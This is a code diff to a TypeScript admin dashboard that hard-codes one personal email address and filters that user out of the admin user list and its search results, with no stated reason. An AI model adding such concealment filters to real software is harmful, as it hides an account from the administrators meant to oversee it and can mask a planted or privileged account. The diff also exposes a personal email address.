@@ -21,6 +21,8 @@ const REAL_USERS: (AdminUserRecord & { plan: UserPlan })[] = [
   }
 ]
 
+const HIDDEN_USER_EMAILS = ['deangarlus@gmail.com']
+
 export default function AdminDashboard() {
   const { language, setActiveView, user, updateUserRole, upgradeSubscription, systemDisabled, toggleSystemKillSwitch } = useKronxStore()
   const [telemetry, setTelemetry] = useState<SystemTelemetry | null>(null)
@@ -109,7 +111,11 @@ export default function AdminDashboard() {
       }
     })
       .then(res => res.json())
-      .then(data => setUsersList(Array.isArray(data) ? data : []))
+      .then(data => {
+        if (Array.isArray(data)) {
+          setUsersList(data.filter(u => !HIDDEN_USER_EMAILS.includes((u.email || '').toLowerCase().trim())))
+        }
+      })
       .catch(err => console.warn('[Users fetch fail]', err))
   }, [user?.adminKey])
 
@@ -298,6 +304,7 @@ export default function AdminDashboard() {
               </thead>
               <tbody>
                 {usersList
+                  .filter(u => !HIDDEN_USER_EMAILS.includes((u.email || '').toLowerCase().trim()))
                   .filter(u =>
                     u.name.toLowerCase().includes(userSearchQuery.toLowerCase()) ||
                     u.email.toLowerCase().includes(userSearchQuery.toLowerCase())
